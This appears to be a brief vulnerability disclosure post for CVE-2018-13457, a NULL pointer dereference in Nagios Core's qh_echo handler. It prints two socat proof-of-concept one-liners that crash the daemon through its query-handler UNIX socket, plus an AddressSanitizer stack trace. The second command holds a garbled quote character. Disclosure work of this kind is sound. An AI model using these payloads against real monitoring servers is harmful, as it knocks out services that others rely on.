---
layout: post
title: "[CVE-2018-13457] Nagios Core qh_echo Denial of Service"
date: 2018-07-09
categories:
    - blog
keywords: "nagios, nagioscore, dos, denial of service"
---

qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.

```
$ echo -ne "#echo\0" | socat unix-connect:./poc/nagios.qh -
$ echo -ne â€œ@echo\0" | socat unix-connect:./poc/nagios.qh -

#0 0x4cb18b in __interceptor_strcmp.part.60 /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:422
#1 0x554e98 in qh_echo /home/user/nagioscore/base/query-handler.c:29:7
#2 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12
#3 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4
#4 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12
#5 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4
#6 0x7f183c5f782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
#7 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)
```
